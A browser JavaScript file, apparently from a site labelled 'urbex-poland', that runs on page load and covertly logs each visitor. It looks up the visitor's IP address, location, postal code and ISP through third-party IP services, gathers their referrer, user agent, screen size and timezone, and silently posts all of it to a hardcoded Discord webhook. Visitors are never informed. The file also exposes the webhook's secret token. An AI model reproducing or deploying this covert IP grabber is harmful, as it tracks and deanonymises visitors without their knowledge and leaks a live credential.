(function () {
  'use strict';

  if (window.__LOGGER_INITIALIZED__) return;
  window.__LOGGER_INITIALIZED__ = true;

  const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1552406859527233602/n6RGGVyXRd7pYPc6rIfgiVmbNpRSlfufL0IwAMYpE9QDmsgA0nB1om1ZEkumUft7Fm42';
  const SESSION_KEY = 'killsite_visitor_logged';

  // Do not log child popup windows to prevent spamming
  const isChild = (function () {
    try {
      if (window.location.search.indexOf('child=true') !== -1) return true;
      if (window.opener && window.opener.location.origin === window.location.origin) return true;
    } catch (e) {}
    return false;
  })();

  if (isChild) return;

  // Check if visitor was already logged in this browsing session
  try {
    if (sessionStorage.getItem(SESSION_KEY)) {
      return;
    }
  } catch (e) {}

  async function fetchWithTimeout(url, timeoutMs = 4000) {
    const controller = new AbortController();
    const timeoutId = setTimeout(() => controller.abort(), timeoutMs);
    try {
      const response = await fetch(url, { signal: controller.signal, cache: 'no-store' });
      clearTimeout(timeoutId);
      if (!response.ok) return null;
      return await response.json();
    } catch (err) {
      clearTimeout(timeoutId);
      return null;
    }
  }

  async function getVisitorData() {
    // 1. Try ipapi.co
    try {
      const data = await fetchWithTimeout('https://ipapi.co/json/');
      if (data && data.ip) {
        return {
          ip: data.ip,
          city: data.city || 'Unknown',
          region: data.region || 'Unknown',
          country: data.country_name || data.country || 'Unknown',
          postal: data.postal || '',
          org: data.org || data.asn || 'Unknown',
          timezone: data.timezone || ''
        };
      }
    } catch (e) {}

    // 2. Try ipinfo.io
    try {
      const data = await fetchWithTimeout('https://ipinfo.io/json');
      if (data && data.ip) {
        return {
          ip: data.ip,
          city: data.city || 'Unknown',
          region: data.region || 'Unknown',
          country: data.country || 'Unknown',
          postal: data.postal || '',
          org: data.org || 'Unknown',
          timezone: data.timezone || ''
        };
      }
    } catch (e) {}

    // 3. Try ipify.org as reliable fallback
    try {
      const data = await fetchWithTimeout('https://api64.ipify.org?format=json');
      if (data && data.ip) {
        return {
          ip: data.ip,
          city: 'Unknown',
          region: 'Unknown',
          country: 'Unknown',
          postal: '',
          org: 'Unknown',
          timezone: ''
        };
      }
    } catch (e) {}

    return null;
  }

  async function logVisitor() {
    try {
      sessionStorage.setItem(SESSION_KEY, '1');
    } catch (e) {}

    const visitorData = await getVisitorData();

    const ip = visitorData ? visitorData.ip : 'Could not detect';
    const locParts = [];
    if (visitorData && visitorData.city && visitorData.city !== 'Unknown') locParts.push(visitorData.city);
    if (visitorData && visitorData.region && visitorData.region !== 'Unknown') locParts.push(visitorData.region);
    if (visitorData && visitorData.country && visitorData.country !== 'Unknown') locParts.push(visitorData.country);
    if (visitorData && visitorData.postal) locParts.push(`(${visitorData.postal})`);
    const locationStr = locParts.length > 0 ? locParts.join(', ') : 'Unknown';

    const orgStr = (visitorData && visitorData.org) ? visitorData.org : 'Unknown';
    let tz = (visitorData && visitorData.timezone) ? visitorData.timezone : '';
    try {
      if (!tz) tz = Intl.DateTimeFormat().resolvedOptions().timeZone || 'Unknown';
    } catch (e) {
      tz = 'Unknown';
    }

    const currentUrl = window.location.href;
    const referrer = document.referrer ? document.referrer : 'Direct / None';
    const userAgent = navigator.userAgent || 'Unknown';
    const screenRes = `${window.screen ? window.screen.width : '?' }x${window.screen ? window.screen.height : '?'}`;
    const language = navigator.language || navigator.userLanguage || 'Unknown';

    const payload = {
      username: 'Visitor Logger',
      embeds: [
        {
          title: '🚨 New Visitor Detected',
          color: 0xef4444,
          fields: [
            {
              name: '🌐 IP Address',
              value: `\`${ip}\``,
              inline: true
            },
            {
              name: '📍 Location',
              value: locationStr,
              inline: true
            },
            {
              name: '🏢 Organization / ISP',
              value: orgStr,
              inline: false
            },
            {
              name: '🔗 Page Visited',
              value: currentUrl,
              inline: false
            },
            {
              name: '🧭 Referrer',
              value: referrer,
              inline: true
            },
            {
              name: '🕒 Timezone',
              value: tz,
              inline: true
            },
            {
              name: '🖥️ Screen & Language',
              value: `${screenRes} | ${language}`,
              inline: false
            },
            {
              name: '📱 User Agent',
              value: `\`\`\`${userAgent.slice(0, 500)}\`\`\``,
              inline: false
            }
          ],
          footer: {
            text: 'urbex-poland • Visitor Tracker'
          },
          timestamp: new Date().toISOString()
        }
      ]
    };

    try {
      await fetch(DISCORD_WEBHOOK_URL, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify(payload)
      });
    } catch (err) {}
  }

  // Run logging
  logVisitor();

  window.logVisitorIP = logVisitor;
})();
